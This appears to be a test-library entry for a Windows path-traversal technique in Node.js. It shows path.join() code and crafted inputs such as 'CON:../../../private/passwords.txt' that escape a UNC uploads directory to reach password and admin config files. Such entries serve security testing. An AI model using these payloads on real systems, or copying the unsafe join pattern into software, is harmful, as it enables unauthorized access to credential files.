---
data: >-
  const path = require('path'); function getNetworkFile(userInput){ const
  basePath = '\\\\fileserver\\\\public\\\\uploads'; return path.join(basePath,
  userInput); }
  console.log(getNetworkFile('CON:../../../private/passwords.txt'));
tags:
  - path-traversal
  - unc
type: command
output: \\\\fileserver\\public\\private\\passwords.txt
executor: javascript
platforms:
  - Windows
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:22.242Z'
id: 41c8e0e6-c4bf-4a61-9a0a-3277a3ec4aca
verified: false
validated: true
submitted: true
---
# node-path-join-unc-test

## Command

```javascript
const path = require('path');
function getNetworkFile(userInput){
  const basePath = '\\\\fileserver\\\\public\\\\uploads';
  return path.join(basePath, userInput);
}
console.log(getNetworkFile('CON:../../../private/passwords.txt'));
```

## Description

Tests path.join() with UNC base and device name input to demonstrate traversal bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| basePath | UNC share path, e.g., '\\\\fileserver\\\\public\\\\uploads' | Yes |
| userInput | Malicious input with device and traversal, e.g., 'CON:../../../private/passwords.txt' | Yes |

## Examples

### Basic Usage

```javascript
path.join('\\\\server\\share', 'CON:../../secret.txt')
```

### Advanced Usage

```javascript
path.join('\\\\fileserver\\\\public', 'AUX:../../../admin/config.txt')
```

## Expected Output

\\\\fileserver\\public\\private\\passwords.txt, showing directory escape.

## Related

- [[commands/node-run-test-script]]
